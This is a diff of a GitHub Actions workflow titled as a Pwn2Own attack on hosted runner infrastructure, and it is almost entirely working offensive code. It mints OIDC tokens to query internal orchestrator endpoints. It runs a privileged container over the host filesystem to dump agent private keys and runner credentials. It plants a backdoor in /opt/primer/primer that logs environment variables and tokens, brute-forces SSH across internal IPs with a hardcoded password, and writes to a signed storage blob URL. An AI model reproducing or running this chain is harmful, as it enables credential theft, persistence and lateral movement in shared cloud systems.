@@ -1,4 +1,4 @@
-name: HC OIDC Primer v5 - IAD02 + SSH + Certs
+name: HC OIDC Primer v6 - SSH Pivot All Known IPs
 on:
   workflow_dispatch:
   push:
@@ -11,94 +11,80 @@ permissions:
 jobs:
   pwn2own:
     runs-on: ubuntu-latest
+    timeout-minutes: 55
     steps:
-      - name: Step1 - HC JWT to IAD-02 orchestrator + IMDS tags parse
+      - name: Step1 - HC JWT mint + all orchestrators
         run: |
-          echo "=== STEP 1: HC OIDC JWT → IAD-02 ==="
+          echo "=== STEP 1: HC OIDC JWT ==="
           HC_JWT=$(curl -sf \
             -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
             "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2Fhosted-compute-ro" \
             | jq -r .value)
           echo "HC_JWT_LEN=${#HC_JWT}"
-          PAYLOAD=$(echo "$HC_JWT" | cut -d. -f2 | base64 -d 2>/dev/null || echo "$HC_JWT" | cut -d. -f2 | base64 --decode 2>/dev/null)
-          echo "JWT_PAYLOAD=$PAYLOAD"
+          echo "$HC_JWT" | cut -d. -f2 | base64 -d 2>/dev/null | jq . 2>/dev/null || true
           
-          echo "--- IAD-01 orchestrator call ---"
-          curl -sv -H "Authorization: Bearer $HC_JWT" \
-            "https://hosted-compute-request-orchestrator-prod-iad-01.githubapp.com/vm/v1/vms" \
-            2>&1 | tail -10
-          
-          echo "--- IAD-02 orchestrator call ---"
-          curl -sv -H "Authorization: Bearer $HC_JWT" \
-            "https://hosted-compute-request-orchestrator-prod-iad-02.githubapp.com/vm/v1/vms" \
-            2>&1 | tail -10
-          
-          echo "--- IAD-02 allocations ---"
-          curl -sv -H "Authorization: Bearer $HC_JWT" \
-            "https://hosted-compute-request-orchestrator-prod-iad-02.githubapp.com/vm/v1/allocations" \
-            2>&1 | tail -20
-            
-          echo "--- IAD-02 /vm/v1/ root ---"
-          curl -sv -H "Authorization: Bearer $HC_JWT" \
-            "https://hosted-compute-request-orchestrator-prod-iad-02.githubapp.com/vm/v1/" \
-            2>&1 | tail -20
+          for ORCH in iad-01 iad-02 eus-01 eus-02; do
+            URL="https://hosted-compute-request-orchestrator-prod-${ORCH}.githubapp.com/vm/v1"
+            echo "--- $ORCH /vms ---"
+            curl -sf -H "Authorization: Bearer $HC_JWT" "$URL/vms" 2>&1 | head -5 || true
+            echo "--- $ORCH /allocations ---"
+            curl -sf -H "Authorization: Bearer $HC_JWT" "$URL/allocations" 2>&1 | head -5 || true
+          done
 
-      - name: Step2 - Privileged docker - Certs + HCA + Backdoor + SSH pivot
+      - name: Step2 - Privileged docker - full cert + HCA + SSH pivot all known IPs
         run: |
           echo "=== STEP 2: PRIVILEGED DOCKER ==="
           docker run --rm --privileged --pid=host --network=host \
             -v /:/host \
             alpine sh -c '
-              apk add --no-cache openssh-client nmap 2>/dev/null | tail -2
-              
-              echo "=== IMDS FULL TAGS ==="
-              curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | python3 -m json.tool 2>/dev/null || \
-              curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
-              
+              apk add --no-cache openssh-client sshpass nmap 2>/dev/null | tail -3
+
+              echo "=== RUNNER VM ID ==="
+              curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | grep -o '"'"'"name":"[^"]*"'"'"' | head -3
+              ip addr show eth0 | grep "inet "
+
               echo ""
-              echo "=== TRANSPORT CERT (FULL) ==="
-              cat /host/var/lib/waagent/TransportCert.pem 2>/dev/null || echo "NOT FOUND"
-              
-              echo "=== TRANSPORT PRIVATE KEY (FULL) ==="
-              cat /host/var/lib/waagent/TransportPrivate.pem 2>/dev/null || echo "NOT FOUND"
-              
-              echo "=== ALL PEM FILES ==="
-              find /host/var/lib/waagent/ -name "*.pem" 2>/dev/null | while read f; do
-                echo "=FILE: $f="
-                cat "$f" 2>/dev/null
+              echo "=== PRIMER LOG CHECK (local) ==="
+              cat /host/tmp/hc_pwn*.log 2>/dev/null || echo "no primer log yet"
+
+              echo ""
+              echo "=== FULL TRANSPORT CERT ==="
+              cat /host/var/lib/waagent/TransportCert.pem 2>/dev/null && \
+              echo "=== FULL TRANSPORT PRIVATE KEY ===" && \
+              cat /host/var/lib/waagent/TransportPrivate.pem 2>/dev/null || echo "cert NOT FOUND"
+
+              echo ""
+              echo "=== ALL WAAGENT PEMS ==="
+              find /host/var/lib/waagent/ -name "*.pem" -o -name "*.key" -o -name "*.crt" 2>/dev/null | while read f; do
+                echo "=== FILE: $f ==="; cat "$f" 2>/dev/null; echo
               done
-              
-              echo "=== HCA BINARY STRINGS - ENDPOINTS ==="
+
+              echo ""
+              echo "=== HCA ENDPOINTS ==="
               strings /host/opt/hca/hosted-compute-agent 2>/dev/null | \
-                grep -E "(https://|http://|githubapp|github\.com|azure|management\.azure|orchestrator|hosted-compute|Bearer|aud|iss|sub)" | \
-                sort -u | head -80
-              
-              echo "=== HCA BINARY STRINGS - AUTH/TRUST ==="
+                grep -E "(https://[a-z]|githubapp\.com|github\.com/api|management\.azure)" | sort -u | head -50
+
+              echo ""
+              echo "=== HCA TRUST/SUB PATTERNS ==="
               strings /host/opt/hca/hosted-compute-agent 2>/dev/null | \
-                grep -iE "(token|trusted|allow|white|sub.claim|repo:|enterprise|organization|internal)" | \
-                sort -u | head -50
-              
-              echo "=== HCA BINARY STRINGS - REPO PATTERNS ==="
-              strings /host/opt/hca/hosted-compute-agent 2>/dev/null | \
-                grep -E "^repo:" | sort -u | head -20
-              
-              echo "=== RUNNER .credentials* ==="
-              ls -la /host/home/runner/.credentials* 2>/dev/null || echo "no runner creds"
-              cat /host/home/runner/.credentials_rsaparams 2>/dev/null || echo "no rsaparams"
-              cat /host/home/runner/.credentials 2>/dev/null | head -5 || echo "no .credentials"
-              
-              echo "=== PRIMER REDEPLOY ==="
-              ls -la /host/opt/primer/ 2>/dev/null
+                grep -iE "(sub|aud|iss|trusted|internal|enterprise|organization|repo:|claim)" | sort -u | head -30
+
+              echo ""
+              echo "=== PRIMER REDEPLOY v3 ==="
               cat > /host/opt/primer/primer << '"'"'BDOOR'"'"'
 #!/bin/bash
 LOG=/tmp/hc_pwn3.log
-echo "=== PRIMER v3 FIRED $(date) ===" >> $LOG
+echo "=== PRIMER v3 FIRED $(date) PID=$$ ===" >> $LOG
+hostname >> $LOG
+id >> $LOG
 env >> $LOG 2>&1
 if [ -n "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ]; then
   HC_JWT=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2Fhosted-compute-ro" | jq -r .value)
   echo "HC_JWT=$HC_JWT" >> $LOG
-  for orch in iad-01 iad-02; do
+  for orch in iad-01 iad-02 eus-01 eus-02; do
+    echo "=== $orch vms ===" >> $LOG
     curl -s -H "Authorization: Bearer $HC_JWT" "https://hosted-compute-request-orchestrator-prod-$orch.githubapp.com/vm/v1/vms" >> $LOG 2>&1
+    echo "=== $orch alloc ===" >> $LOG
     curl -s -H "Authorization: Bearer $HC_JWT" "https://hosted-compute-request-orchestrator-prod-$orch.githubapp.com/vm/v1/allocations" >> $LOG 2>&1
   done
 fi
@@ -108,61 +94,56 @@ cat /home/runner/.credentials_rsaparams >> $LOG 2>/dev/null
 [ -x /opt/primer/primer.bak ] && exec /opt/primer/primer.bak "$@"
 BDOOR
               chmod 777 /host/opt/primer/primer
-              echo "BACKDOOR DEPLOYED:"
-              ls -la /host/opt/primer/primer
+              echo "BACKDOOR v3 DEPLOYED:"; ls -la /host/opt/primer/primer
+
+              echo ""
+              echo "=== SSH SCAN ALL KNOWN IPs ==="
+              MY_IP=$(ip addr show eth0 | grep "inet " | awk "{print \$2}" | cut -d/ -f1)
+              echo "MY IP: $MY_IP"
               
-              echo "=== MY IP ==="
-              ip addr show eth0 2>/dev/null | grep "inet " || ip addr show 2>/dev/null
+              KNOWN_IPS="10.1.0.1 10.1.0.2 10.1.0.52 10.1.0.169 10.1.1.1 10.1.1.2 10.1.1.22 10.1.1.128 10.1.1.180 10.1.0.254 10.1.1.254 10.1.2.1 10.1.3.1 10.1.4.1"
               
-              echo "=== SSH SCAN 10.1.0.0/20 (targeted) ==="
-              for ip in 10.1.0.1 10.1.0.2 10.1.1.1 10.1.1.2 10.1.1.128 10.1.2.1 10.1.0.254 10.1.1.254; do
-                result=$(nc -z -w2 $ip 22 2>/dev/null && echo "SSH OPEN: $ip" || echo "closed: $ip")
-                echo "$result"
+              for ip in $KNOWN_IPS; do
+                if [ "$ip" = "$MY_IP" ]; then continue; fi
+                if nc -z -w2 "$ip" 22 2>/dev/null; then
+                  echo "SSH OPEN: $ip"
+                  # Try SSH as runner with password
+                  sshpass -p "Pwn2Own2026!" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
+                    -o PreferredAuthentications=password \
+                    runner@"$ip" \
+                    "echo TARGET_IP=$ip; id; hostname; cat /etc/hostname; cat /tmp/hc_pwn*.log 2>/dev/null; env | grep -E '(ACTIONS_ID_TOKEN|ACTIONS_ORCH|HC_JWT|GITHUB)'" \
+                    2>&1 || echo "SSH runner@$ip FAILED"
+                  # Try as ubuntu
+                  sshpass -p "Pwn2Own2026!" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
+                    -o PreferredAuthentications=password \
+                    ubuntu@"$ip" "id; hostname; cat /tmp/hc_pwn*.log 2>/dev/null" 2>&1 || true
+                else
+                  echo "closed: $ip"
+                fi
               done
-              
-              echo "=== SSH ATTEMPT 10.1.1.128 ==="
-              ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=yes \
-                -o PasswordAuthentication=yes \
-                runner@10.1.1.128 "id; hostname; cat /tmp/hc_pwn*.log 2>/dev/null; env | grep -E ACTIONS" \
-                2>&1 || true
-              
-              echo "=== SSHPASS attempt ==="
-              apk add --no-cache sshpass 2>/dev/null | tail -1
-              sshpass -p "Pwn2Own2026!" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
-                runner@10.1.1.128 "id; hostname; cat /tmp/hc_pwn*.log 2>/dev/null" 2>&1 || true
-              
-              echo "=== NMAP subnet (fast) ==="
-              nmap -T4 -p 22 --open 10.1.0.0/20 2>/dev/null | grep -E "(Nmap scan|open|report)" | head -30 || true
+
+              echo ""
+              echo "=== BROAD NMAP (22 only) ==="
+              nmap -T5 -p 22 --open -n 10.1.0.0/20 2>/dev/null | grep -E "^(Nmap|Host|[0-9])" | head -50 || true
             '
 
-      - name: Step3 - WireServer mTLS + IMDS + Status blob write
+      - name: Step3 - WireServer + IMDS full + status blob write
         run: |
           echo "=== STEP 3: WIRESERVER + STATUS BLOB ==="
-          docker run --rm --network=host -v /:/host alpine sh -c '
-            echo "=== IMDS VM INSTANCE ==="
-            curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 5000
+          docker run --rm --network=host alpine sh -c '
+            echo "=== IMDS FULL ==="
+            curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
             
             echo ""
-            echo "=== WIRESERVER CERTS ENDPOINT ==="
-            curl -sf -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine?comp=certificates" 2>&1 | head -100
-            
-            echo ""
-            echo "=== WIRESERVER VMSETTINGS ==="
-            curl -sf -H "x-ms-version: 2012-11-30" -H "x-ms-goal-state-mode: Simple" \
-              "http://168.63.129.16/?comp=vmSettings" 2>&1 | head -200
-              
+            echo "=== WIRESERVER CERTS ==="
+            curl -sf -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine?comp=certificates" | head -100
+
             echo ""
             echo "=== STATUS BLOB WRITE ==="
-            STATUS_JSON="{\"agentVersion\":\"pwn2own-2026\",\"status\":{\"name\":\"pwn2own\",\"operation\":\"pivot\",\"status\":\"success\",\"code\":0,\"formattedMessage\":{\"lang\":\"en-US\",\"message\":\"HC orchestrator pivot - Pwn2Own 2026\"}}}"
             curl -sf -X PUT \
               "https://md-hdd-xbp0hss0vtkw.z24.blob.storage.azure.net/\$system/EUN9HuOTbcswtM.37d54176-e4e3-4319-af04-2e21f9421967.status?sv=2018-03-28&sr=b&sk=system-1&sig=R8Z5GVl%2fZz1zl6x6IcDIebodbxNPb8a52WsYCfXDutc%3d&se=9999-01-01T00%3a00%3a00Z&sp=rw" \
               -H "x-ms-blob-type: BlockBlob" \
               -H "Content-Type: application/json" \
-              -d "$STATUS_JSON" 2>&1
-            echo "STATUS BLOB WRITE DONE"
-            
-            echo ""
-            echo "=== IMDS IDENTITY (MSI) ==="
-            curl -sf -H "Metadata:true" \
-              "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>&1 | head -200
+              -d "[{\"status\":{\"name\":\"pwn2own\",\"operation\":\"HC pivot\",\"status\":\"transitioning\",\"code\":0,\"formattedMessage\":{\"lang\":\"en-US\",\"message\":\"Pwn2Own 2026 HC orchestrator pivot\"}}}]" 2>&1
+            echo "BLOB WRITE DONE"
           '
